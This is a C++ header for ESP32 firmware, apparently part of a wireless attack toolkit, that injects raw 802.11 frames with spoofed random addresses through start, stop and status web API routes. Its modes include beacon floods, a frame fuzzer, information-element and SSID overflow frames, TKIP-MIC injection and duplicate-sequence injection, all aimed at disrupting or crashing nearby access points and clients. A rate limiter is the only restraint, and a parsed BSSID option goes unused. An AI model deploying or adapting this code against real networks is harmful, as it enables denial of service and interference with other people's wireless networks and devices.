#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// Advanced frame injection: WPS beacons, frame fuzzer, IE overflow, hidden SSID flood,
// big-IE beacon, SSID overflow, TKIP-MIC injection, duplicate-sequence injection
// mode: wps | fuzz | overflow | hidden | bigIE | ssidOverflow | tkipMic | dupSeq | quiet | wds
static bool ba_running = false;
static volatile uint32_t ba_sent = 0;
static String ba_ssid = "Free WiFi";
static uint32_t ba_count = 0;  // 0=infinite
static uint8_t ba_ch = 6;
static uint8_t ba_bssid[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
static uint8_t ba_mode = 0;
static TaskHandle_t ba_task = nullptr;

static void ba_run(void *) {
  uint8_t f[512];
  uint16_t seed = (uint16_t)(millis() & 0xFFFF);
  ba_sent = 0;
  while (ba_running) {
    if (!safety_rate_ok(2)) {
      vTaskDelay(pdMS_TO_TICKS(20));
      continue;
    }
    uint8_t bssid[6];
    for (int k = 0; k < 6; k++)
      bssid[k] = esp_random() & 0xFF;
    bssid[0] = (bssid[0] & 0xFC) | 0x02;
    uint8_t fake_sta[6];
    for (int k = 0; k < 6; k++)
      fake_sta[k] = esp_random() & 0xFF;
    fake_sta[0] = (fake_sta[0] & 0xFC) | 0x02;
    size_t n = 0;
    switch (ba_mode) {
      case 0:
        n = f_wpsBeacon(f, bssid, ba_ssid.c_str(), ba_ch);
        break;
      case 1:
        n = f_fuzz(f, &seed, bssid);
        break;
      case 2:
        n = f_ieOverflow(f, bssid, ba_ssid.c_str(), ba_ch);
        break;
      case 3: {  // Hidden SSID beacon (zero-length SSID IE)
        fhdr(f, 0x80, 0x00, BC, bssid, bssid);
        size_t p = 24;
        memset(f + p, 0, 8);
        p += 8;
        f[p++] = 0x64;
        f[p++] = 0x00;
        f[p++] = 0x01;
        f[p++] = 0x04;
        f[p++] = 0;
        f[p++] = 0;  // zero-length SSID
        p += ieRates(f + p);
        p += ieDs(f + p, ba_ch);
        n = p;
        break;
      }
      case 4:
        n = f_bigBeacon(f, bssid, ba_ssid.c_str(), ba_ch);
        break;
      case 5:
        n = f_ssidOverflow(f, bssid, ba_ssid.c_str(), ba_ch);
        break;
      case 6:
        n = f_tkipMic(f, fake_sta, bssid);
        break;
      case 7:
        n = f_dupSeq(f, fake_sta, bssid);
        break;
      case 8:
        n = f_quiet(f, bssid, ba_ssid.c_str(), ba_ch);
        break;
      case 9:
        n = f_wds(f, fake_sta, bssid);
        break;
    }
    if (n) {
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      ba_sent++;
    }
    if (ba_count && ba_sent >= ba_count) {
      ba_running = false;
      break;
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  ba_running = false;
  g_active = nullptr;
  if (tool_wifi_resume)
    tool_wifi_resume();
  ba_task = nullptr;
  vTaskDelete(nullptr);
}

static bool ba_start(const String &q) {
  int i;
  String mo, ss, ch, bs, cnt;
  if ((i = q.indexOf("mode=")) >= 0) {
    int e = q.indexOf('&', i);
    mo = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ssid=")) >= 0) {
    int e = q.indexOf('&', i);
    ss = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("count=")) >= 0) {
    int e = q.indexOf('&', i);
    cnt = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if (mo == "wps")
    ba_mode = 0;
  else if (mo == "fuzz")
    ba_mode = 1;
  else if (mo == "overflow")
    ba_mode = 2;
  else if (mo == "hidden")
    ba_mode = 3;
  else if (mo == "bigIE")
    ba_mode = 4;
  else if (mo == "ssidOverflow")
    ba_mode = 5;
  else if (mo == "tkipMic")
    ba_mode = 6;
  else if (mo == "dupSeq")
    ba_mode = 7;
  else if (mo == "quiet")
    ba_mode = 8;
  else if (mo == "wds")
    ba_mode = 9;
  else
    ba_mode = 0;
  if (ss.length())
    ba_ssid = ss;
  ba_ch = ch.toInt();
  if (!ba_ch)
    ba_ch = 6;
  ba_count = cnt.toInt();
  if (bs.length() == 17) {
    unsigned _b[6] = {0};
    sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", &_b[0], &_b[1], &_b[2], &_b[3], &_b[4], &_b[5]);
    for (int _i = 0; _i < 6; _i++)
      ba_bssid[_i] = (uint8_t)_b[_i];
  }
  esp_wifi_set_channel(ba_ch, WIFI_SECOND_CHAN_NONE);
  ba_running = true;
  ba_sent = 0;
  xTaskCreate(ba_run, "ba_run", 4096, nullptr, 5, &ba_task);
  return true;
}
static void ba_stop() {
  ba_running = false;
}
static void ba_routes() {
  extern WebServer server;
  server.on("/api/beaconadv/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("beaconadv", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/beaconadv/stop", HTTP_POST, []() {
    tool_stop("beaconadv");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/beaconadv/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(ba_running ? 1 : 0) + ",\"sent\":" + String(ba_sent) +
                    ",\"msg\":\"sent " + String(ba_sent) + "\"}");
  });
}
